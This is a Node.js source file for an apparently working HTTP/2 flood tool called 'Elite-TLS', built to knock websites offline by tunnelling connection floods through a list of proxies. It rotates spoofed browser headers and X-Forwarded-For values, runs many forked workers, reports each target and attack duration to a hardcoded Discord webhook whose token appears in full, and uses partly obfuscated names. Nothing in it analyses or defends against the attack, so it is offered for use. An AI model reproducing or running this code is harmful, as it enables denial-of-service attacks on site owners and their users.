const net = require("net");
const http2 = require("http2");
const tls = require('tls');
const cluster = require('cluster');
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const {
  Webhook,
  MessageBuilder
} = require("discord-webhook-node");
const hook = new Webhook("https://discord.com/api/webhooks/1105722747440599120/WEZqQ-KioHLLhZ60L1MxyWXag_U0gXfwjkl2NUGbmCiIyMVTuSo5hi45EJEErjmjTf3s");
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
if (process.argv.length < 0x5) {
  console.log("                 Elite-TLS\n            Useragent Path : ua.txt\n            Proxy Path : proxy.txt \nUsage: node Elite-TLS https://target.com time 64 threads");
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], ...defaultCiphers.slice(0x3)].join(':');
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': "TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0,"
};
const secureContext = tls.createSecureContext(secureContextOptions);
var proxyFile = "proxy.txt";
var proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().split(/\r?\n/);
var userAgents = fs.readFileSync("ua.txt", 'utf-8').toString().split(/\r?\n/);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5]
};
const embed = new MessageBuilder().setTitle("Attack-Logs").addField("Host", args.target, true).addField('Time', args.time, true).setColor('#00b0f4').setTimestamp();
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  hook.send(embed);
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x5172aa, _0x3bcfa7) {
    console.log("babu nya stret (zxky) | Sedang Menyerang " + args.target);
    const _0x53f3ae = "CONNECT " + _0x5172aa.address + ":443 HTTP/1.1\r\nHost: " + _0x5172aa.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x5e9750 = new Buffer.from(_0x53f3ae);
    const _0x277ddb = net.connect({
      'host': _0x5172aa.host,
      'port': _0x5172aa.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x277ddb.setTimeout(_0x5172aa.timeout * 0x2710);
    _0x277ddb.setKeepAlive(true, 0x2710);
    _0x277ddb.setNoDelay(true);
    _0x277ddb.on("connect", () => {
      _0x277ddb.write(_0x5e9750);
    });
    _0x277ddb.on("data", _0x37df5d => {
      const _0x2b1c42 = _0x37df5d.toString("utf-8");
      const _0x5ee66d = _0x2b1c42.includes("HTTP/1.1 200");
      if (_0x5ee66d === false) {
        _0x277ddb.destroy();
        return _0x3bcfa7(undefined, "error: invalid response from proxy server");
      }
      return _0x3bcfa7(_0x277ddb, undefined);
    });
    _0x277ddb.on("timeout", () => {
      _0x277ddb.destroy();
      return _0x3bcfa7(undefined, "error: timeout exceeded");
    });
    _0x277ddb.on("error", _0x4f09a4 => {
      _0x277ddb.destroy();
      return _0x3bcfa7(undefined, "error: " + _0x4f09a4);
    });
  }
}
const Socker = new NetSocket();
function readLines(_0x5767a2) {
  return fs.readFileSync(_0x5767a2, 'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x2a5d25, _0x97b01) {
  return Math.floor(Math.random() * (_0x97b01 - _0x2a5d25) + _0x2a5d25);
}
function randomElement(_0x493009) {
  return _0x493009[Math.floor(Math.random() * (_0x493009.length - 0x0) + 0x0)];
}
function randomCharacters(_0x17ed82) {
  output = '';
  for (let _0x394a90 = 0x0; _0x394a90 < _0x17ed82; _0x394a90++) {
    output += characters[Math.floor(Math.random() * (characters.length - 0x0) + 0x0)];
  }
  return output;
}
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers['accept-language'] = 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3';
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = ['?0', '?1'][Math.floor(Math.random() * (['?0', '?1'].length - 0x0) + 0x0)];
headers['sec-ch-ua-platform'] = ["Android", 'iOS', "Linux", "macOS", "Windows"][Math.floor(Math.random() * (["Android", 'iOS', "Linux", "macOS", "Windows"].length - 0x0) + 0x0)];
headers["sec-fetch-dest"] = 'document';
headers["sec-fetch-mode"] = 'navigate';
headers["sec-fetch-site"] = "same-origin";
headers['upgrade-insecure-requests'] = '1';
function runFlooder() {
  const _0x56fde0 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x504ba5 = _0x56fde0.split(':');
  headers[':authority'] = parsedTarget.host;
  headers['user-agent'] = userAgents[Math.floor(Math.random() * (userAgents.length - 0x0) + 0x0)];
  headers["x-forwarded-for"] = _0x504ba5[0x0];
  const _0x327d98 = {
    'host': _0x504ba5[0x0],
    'port': ~~_0x504ba5[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0xf
  };
  Socker.HTTP(_0x327d98, (_0x3902ba, _0x428052) => {
    if (_0x428052) {
      return;
    }
    _0x3902ba.setKeepAlive(true, 0xea60);
    _0x3902ba.setNoDelay(true);
    const _0x13b37e = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x116462 = {
      'port': 0x1bb,
      'secure': true,
      'ALPNProtocols': ['h2'],
      'ciphers': ciphers,
      'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      'requestCert': true,
      'socket': _0x3902ba,
      'ecdhCurve': "GREASE:x25519:secp256r1:secp384r1",
      'honorCipherOrder': false,
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'clientCertEngine': 'dynamic',
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_client_method"
    };
    const _0x37bd2d = tls.connect(0x1bb, parsedTarget.host, _0x116462);
    _0x37bd2d.allowHalfOpen = true;
    _0x37bd2d.setNoDelay(true);
    _0x37bd2d.setKeepAlive(true, 60000);
    _0x37bd2d.setMaxListeners(0x0);
    const _0x2b0595 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': _0x13b37e,
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x37bd2d
    });
    _0x2b0595.setMaxListeners(0x0);
    _0x2b0595.settings(_0x13b37e);
    _0x2b0595.on("connect", () => {});
    _0x2b0595.on('close', () => {
      _0x2b0595.destroy();
      _0x3902ba.destroy();
      return;
    });
    _0x2b0595.on("error", _0x3df574 => {
      _0x2b0595.destroy();
      _0x3902ba.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);
process.on("uncaughtException", _0x4e0507 => {});
process.on("unhandledRejection", _0x2c96ea => {});